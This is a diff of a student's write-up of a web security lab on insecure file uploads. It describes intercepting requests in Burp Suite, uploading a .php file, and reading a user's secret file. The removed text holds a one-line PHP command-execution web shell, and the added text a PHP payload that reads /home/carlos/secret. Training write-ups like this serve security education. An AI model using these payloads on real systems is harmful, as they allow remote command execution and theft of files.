@@ -7,30 +7,48 @@ This lab demonstrates how insecure file upload functionality can lead to remote 
 ## 2. Learning Objectives
 - Understand insecure file upload vulnerabilities      
 - Upload a malicious script file  
-- Execute arbitrary system commands remotely  
+- Understand the response 
 
 ## 3. Tools used
 - Burp suite
 
-## Recon & Initial Observations
+## 4. Recon & Initial Observations
 During initial exploration of the site:
+- logged in using the given credentials
+- The webiste provides an image upload feature 
+- looked at the POST and GET requests through the burp suite proxy tab    
 
-- The application provides an image upload feature  
-- The server appears to validate file extensions but not file content  
-- Uploaded files are accessible from a predictable directory  
-- Error messages reveal how the server handles invalid uploads  
+## 5. Attack Strategy
+1. Intercept the upload request using Burp Suite:  
 
-These behaviours suggest the upload mechanism may be vulnerable.
+![](images/POST_request.png)
 
-## Attack Strategy
-1. Intercept the upload request using Burp Suite  
-2. Modify the filename to use a script extension (e.g., `.php`)  
-3. Adjust the `Content-Type` header if necessary  
-4. Upload a simple web shell  
-5. Access the uploaded file directly to trigger command execution  
+result:
 
-## Payload Used
-Example PHP web shell:
+![](images/POST_php_response.png)
 
-```php
-<?php echo system($_GET['cmd']); ?>
+2. As well as intercept the GET request:
+
+![](images/GET_request.png)
+
+3. I Modified the filename to use the script extension `.php` and used a simple web shell:
+
+![](images/php_payload.png)
+
+4. I then changed the GET request to myexploit.php and got the result i wanted:
+
+![](images/GET_php_response.png)
+
+5. I then switched out the payload to find carlos's secret key which is what the lab requested
+
+## 6. Payload Used
+
+```<?php echo file_get_contents('/home/carlos/secret'); ?>```
+
+- I then got the secret key i was looking for:
+
+![](images/secret_key.png)
+
+## 7. Conclusion
+
+This lab highlights how insecure file upload functionality can lead compromise in the website. By bypassing weak validation and uploading a web shell, an attacker can veiw files and pages that he wouldn't be able to veiw as a normal user.
